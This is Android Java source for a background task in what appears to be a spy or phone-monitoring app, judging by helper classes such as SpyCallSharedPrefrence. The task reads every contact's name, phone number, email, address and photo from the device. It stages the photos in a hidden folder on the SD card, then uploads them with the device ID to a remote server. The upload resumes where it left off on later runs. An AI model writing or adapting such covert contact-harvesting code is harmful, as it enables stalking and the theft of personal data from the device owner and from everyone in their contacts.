/**
 * Copyright OCTAL INFO SOLUTIONS PVT LTD.
 */
package com.hinj.asynctask;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;

import org.json.JSONObject;

import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.content.res.AssetFileDescriptor;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Email;
import android.provider.ContactsContract.CommonDataKinds.StructuredPostal;
import android.provider.Settings.Secure;
import android.util.Log;

import com.hinj.app.utils.ConnectUrl;
import com.hinj.app.utils.InstalledApp;
import com.hinj.app.utils.JsonPostRequest;
import com.hinj.app.utils.RequestPost;
import com.hinj.app.utils.SpyCallSharedPrefrence;
import com.hinj.app.utils.Utility;
import com.hinj.secure.smsgps.DeviceInterface;

public class ContactImageUpload extends AsyncTask<String, Void, String> {
	
	Bitmap resized;
	private static final String TAG = "ContactImageUpload";
	private Context ctx;
	private RequestPost mRequestPostClass;
	private DeviceInterface onComplete;	
	String ContactImageDetailList="";
	String displayName = "", emailAddress = "", phoneNumber = "",UserAddress = "";
	
	private InstalledApp[] latestInstalledApp;
	
	public ContactImageUpload(Context ctx,DeviceInterface onComplete) {
		this.ctx=ctx;
		this.onComplete=onComplete;
	}
	
	@Override
	public void onPreExecute() {
	}

	@Override
	protected String doInBackground(String... params) {
		try{
			getContactImageDetail();
		}catch(Exception e){
			e.printStackTrace();
		}finally{
			onComplete.onCompletedContactImageUpload();
		}
		return null;
	}

	@Override
	public void onPostExecute(String serverResponse) {
		
	}
	
	/*********************** Start Contact Imagwe Upload *********************/
	public void getContactImageDetail(){
		try {
			String newFilePath="";
			ContactImageDetailList = "";
			
			ContentResolver cr = ctx.getContentResolver();
			Cursor CursorPhones = ctx.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null,null);
			int PreCallListCount = SpyCallSharedPrefrence.getsaveCONTACT_Image_Count(ctx);
			int getTotalCount = CursorPhones.getCount();
			int remaningContactList = getTotalCount - PreCallListCount;
			if (remaningContactList != 0) {
				Log.d("PreCallListCount", PreCallListCount + " getTotalCount: "
						+ getTotalCount + " remaningContactList: "
						+ remaningContactList);

				Cursor cursor = ctx.getContentResolver().query(
						ContactsContract.Contacts.CONTENT_URI,
						null,
						null,
						null,
						ContactsContract.Contacts._ID + " LIMIT "
								+ PreCallListCount + "," + remaningContactList);
				
				Bitmap photo = null;
				
				while (cursor.moveToNext()) {
					displayName = "";
					emailAddress = "";
					phoneNumber = "";
					UserAddress = "";
					displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
					String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
					
					  try {
					        Cursor cur = this.ctx.getContentResolver().query(
					                ContactsContract.Data.CONTENT_URI,
					                null,
					                ContactsContract.Data.CONTACT_ID + "=" + id + " AND "
					                        + ContactsContract.Data.MIMETYPE + "='"
					                        + ContactsContract.CommonDataKinds.Photo.CONTENT_ITEM_TYPE + "'", null,
					                null);
					        if (cur != null) {
					            if (!cur.moveToFirst()) {
					            }
					        } else {
					        }
					    } catch (Exception e) {
					        e.printStackTrace();
					    }
					    Uri person = ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI, Long.parseLong(id));
					    
					    System.out.println(Uri.withAppendedPath(person, ContactsContract.Contacts.Photo.CONTENT_DIRECTORY)); 
					    //  return Uri.withAppendedPath(person, ContactsContract.Contacts.Photo.CONTENT_DIRECTORY);
					    try {
							InputStream inputStream = ContactsContract.Contacts.openContactPhotoInputStream(ctx.getContentResolver(),
											ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI, Long.parseLong(id)));
							if (inputStream != null) {
								photo = BitmapFactory.decodeStream(inputStream);
								/************************************/
								try
								{
									resized = Bitmap.createScaledBitmap(photo,(int)(1000), (int)(1000), true);//new
									newFilePath = saveImage2(resized,id);
				                }
				                catch (Exception e) {
				                	e.printStackTrace();
				                	break;                
								}
								inputStream.close();
							}
						} catch (Exception e) {
							e.printStackTrace();
						}
						
					/*******************************/
					Cursor Address = cr.query(StructuredPostal.CONTENT_URI,null, StructuredPostal.CONTACT_ID + " = " + id,null, null);
					while (Address.moveToNext()) {
						UserAddress = Address.getString(Address.getColumnIndex(StructuredPostal.DATA));
						break;
					}
					Address.close();
					/*******************************/
					Cursor emails = cr.query(Email.CONTENT_URI, null,Email.CONTACT_ID + " = " + id, null, null);
					while (emails.moveToNext()) {
						emailAddress = emails.getString(emails.getColumnIndex(Email.DATA));
						break;
					}
					emails.close();
					if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
						Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,ContactsContract.CommonDataKinds.Phone.CONTACT_ID+ " = ?", new String[] { id },null);
						while (pCur.moveToNext()) {
							phoneNumber = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
							break;
						}
						pCur.close();
					}
					
					// firstname|||phone|||mobile|||emailAdd|||orgStr|||jobTitleStr|||dateStr|||Address|||ZipCode
					String strCall = Uri.encode(displayName) + "|||" + ""
							+ "|||" + phoneNumber + "|||"
							+ Uri.encode(emailAddress) + "|||" + Uri.encode("")
							+ "|||" + Uri.encode("") + "|||" + Uri.encode("")
							+ "|||" + Uri.encode(UserAddress) + "|||"
							+ Uri.encode("");

					if (ContactImageDetailList.length() != 0) {
						ContactImageDetailList = strCall + "##KM##" + ContactImageDetailList;
					} else {
						ContactImageDetailList = strCall;
					}
					
					int total = PreCallListCount + remaningContactList;
					if (Utility.isNetworkAvailable(ctx)) {
						if(!newFilePath.equalsIgnoreCase(""))
						{
							new YourAsyncTask_ImagesDetail().execute(newFilePath, phoneNumber, total+ "",PreCallListCount+"",displayName,emailAddress,UserAddress);
							displayName = "";
							emailAddress = "";
							phoneNumber = "";
							UserAddress = "";
							newFilePath="";
						}
					}
				}
				cursor.close();

				
				remaningContactList = 0;
				/*if (Utility.isNetworkAvailable(ctx)) {
					new YourAsyncTask_ImagesDetail().execute(newFilePath, phoneNumber, total+ "",PreCallListCount+"",displayName,emailAddress,UserAddress);
				}*/
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	/*********************** Start Contact Imagwe Upload *********************/
	
	/********************************** Images Upload On Server Start*****************************/ 

	class YourAsyncTask_ImagesDetail extends AsyncTask<String, Void, Void> {

		int getcountImage=0;
		int getRemainingCount;
		String getResponceImages;

		@Override
		protected void onPreExecute() {
		}

		@Override
		protected Void doInBackground(String... params) {
			// make your request here - it will run in a different thread
			try {
				getcountImage=Integer.parseInt(params[2]);
				getRemainingCount=Integer.parseInt(params[3]);

				getResponceImages = uploadImage2(params[0], params[1], params[4],params[5],params[6]);

				JSONObject responseObject = new JSONObject(getResponceImages);
				//JSONArray responseArray = responseObject.getJSONArray("upload");
				JSONObject JsonResponse =responseObject.getJSONObject("response");
				if(JsonResponse.getString("photo").toString().contains("Contact image uploaded successfully"))
				{
					SpyCallSharedPrefrence.saveCONTACT_Image_Count(ctx,Integer.parseInt(params[5]));
				}
			} catch (Exception e) {
				e.printStackTrace();
			}

			return null;
		}

		@Override
		protected void onPostExecute(Void result) {			
			if(getcountImage==getRemainingCount) {
				try {
					//deleteFolder();
					// getVideoDetail();
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}

	public String uploadImage2(String newFilePath, String phoneNumber,String displayName,
			String emailAddress,String UserAddress) {
		String android_id = Secure.getString(ctx.getContentResolver(),Secure.ANDROID_ID);
		
		Log.i("resonse", "anotherone");
		File file = new File(newFilePath);
		ArrayList<String> arraylist2 = new ArrayList<String>();
		arraylist2.add(file.getPath());
		ArrayList<String[]> arraylist1 = new ArrayList<String[]>();		
		String b[] = { "upload_device_id", android_id };
		arraylist1.add(b); 
		String c[] = { "firstname",displayName};
		arraylist1.add(c); 
		String d[] = { "mobile",phoneNumber };
		arraylist1.add(d); 
		String e[] = { "emailAdd",emailAddress };
		arraylist1.add(e); 
		
		JsonPostRequest postrequest = new JsonPostRequest();
		String imageResponse = postrequest.doPostWithFile1(ConnectUrl.URL_Contact_Image_upload, arraylist1,arraylist2, phoneNumber, "png");
		arraylist2.clear();
		arraylist1.clear();         
		return imageResponse;
	}
	//deleting the existing folder for image creation
	public static void deleteFolder()
	{
        try{
        Log.i("Remove File", "file Delete from folder iflDevice");	
		String fileSavePath="/mnt/sdcard/.iflDevice";
		File Imagedirectory=new File(fileSavePath);

		if(Imagedirectory.exists())
		{
			final File[] files = Imagedirectory.listFiles();
			for (File f: files)
			{
				f.delete();
			}
			Imagedirectory.delete();
		}}catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	/*
	 * saving image from bitmap in portrait mode to upload at server
	 */
	public static String saveImage(Bitmap bm,int id)
	{
		//	file.createNewFile();
	
		File file=null;
		File folder=new File("/mnt/sdcard/.iflDevice");
		if(!folder.exists())
		{
			folder.mkdirs();
		}
		try {
			file = new File(folder,"image"+id+".jpeg");
			//Log.e("Image Name",file.getName()+"  getTotalSpace  "+bm.getByteCount());
			FileOutputStream fileOutputStream = new FileOutputStream(file);
			BufferedOutputStream bos = new BufferedOutputStream(fileOutputStream);		
			bm.compress(CompressFormat.JPEG,80,bos);
			
			bos.flush();
			bos.close();

			bm.recycle();
			System.gc();
			
			
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
		catch (Exception e) {
			e.printStackTrace();
		}
		return file.getAbsolutePath();
	}
	
	
	public static String saveImage2(Bitmap bm,String id)
	{
		//	file.createNewFile();
	
		File file=null;
		File folder=new File("/mnt/sdcard/.iflDevice");
		if(!folder.exists())
		{
			folder.mkdirs();
		}
		try {
			file = new File(folder,"image"+id+".jpeg");
			//Log.e("Image Name",file.getName()+"  getTotalSpace  "+bm.getByteCount());
			FileOutputStream fileOutputStream = new FileOutputStream(file);
			BufferedOutputStream bos = new BufferedOutputStream(fileOutputStream);		
			bm.compress(CompressFormat.JPEG,80,bos);
			
			bos.flush();
			bos.close();

			bm.recycle();
			System.gc();
			
			
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
		catch (Exception e) {
			e.printStackTrace();
		}
		return file.getAbsolutePath();
	}
	
	/********************************** Images Upload On Server End*****************************/

	public static Bitmap readBitmap(Uri selectedImage,Context ctx) {
		Bitmap bm = null;
		BitmapFactory.Options options = new BitmapFactory.Options();
		options.inSampleSize = 5;
		AssetFileDescriptor fileDescriptor =null;
		try {
			fileDescriptor = ctx.getContentResolver().openAssetFileDescriptor(selectedImage,"r");
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		
		}
		finally{
			try {
				bm = BitmapFactory.decodeFileDescriptor(fileDescriptor.getFileDescriptor(), null, options);
				fileDescriptor.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return bm;
	} 
	
}
